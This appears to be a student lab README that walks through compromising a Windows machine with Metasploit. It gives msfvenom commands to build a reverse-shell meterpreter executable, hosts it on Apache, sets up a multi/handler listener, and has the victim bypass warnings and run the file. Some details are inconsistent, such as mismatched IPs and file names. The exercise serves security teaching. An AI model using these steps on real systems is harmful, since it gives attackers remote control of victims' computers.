# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="699" height="331" alt="image" src="https://github.com/user-attachments/assets/3f10331c-c5ad-4e7b-9f29-20590e40309d" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="704" height="491" alt="image" src="https://github.com/user-attachments/assets/9dd5f8ff-be50-46d5-80af-b323089a81f4" />



copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="704" height="491" alt="image" src="https://github.com/user-attachments/assets/184cf332-9a70-479c-8db1-a6379a31489b" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/2f17ff28-787c-4ab3-bb91-fa97ac8487d5" />



Check the status of apache2
## OUTPUT:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/8b68c130-4f44-4810-914c-37430f6f31d1" />


Invoke msfconsole:
## OUTPUT:
<img width="696" height="531" alt="image" src="https://github.com/user-attachments/assets/575fded7-f629-4578-ab62-414affaca177" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="696" height="719" alt="image" src="https://github.com/user-attachments/assets/c803e499-fb57-4870-aca1-af6752e55d01" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/ddc6b303-4d4d-4d5d-aaaa-95f84128aaa1" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.56.102/fun.exe  ( Replace IP address appropriately)
The file "kvk.exe" downloads. 
## OUTPUT:

<img width="1320" height="755" alt="image" src="https://github.com/user-attachments/assets/1595bd30-0ae8-49ff-800e-7b6486d4bc14" />

Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1320" height="755" alt="image" src="https://github.com/user-attachments/assets/1595bd30-0ae8-49ff-800e-7b6486d4bc14" />



On kali/parrot give the command exploit
## OUTPUT:

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/3c52db19-32d0-4fa6-886a-e568a26d251b" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
